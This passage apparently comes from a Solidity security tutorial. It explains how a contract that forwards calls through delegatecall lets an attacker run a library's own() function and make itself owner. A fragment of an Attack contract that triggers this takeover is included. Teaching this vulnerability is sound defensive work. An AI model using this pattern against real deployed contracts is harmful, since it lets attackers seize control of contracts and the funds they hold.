...
selector of own(). HackMe forwards the call to Lib using delegatecall.
Here msg.data contains the function selector of own().
This tells Solidity to call the function own() inside Lib.
The function own() updates the owner to msg.sender.
...
contract Attack {
    ...
    function attack() public {
        hackMe.call(abi.encodeWithSignature("own()"));
    }
}
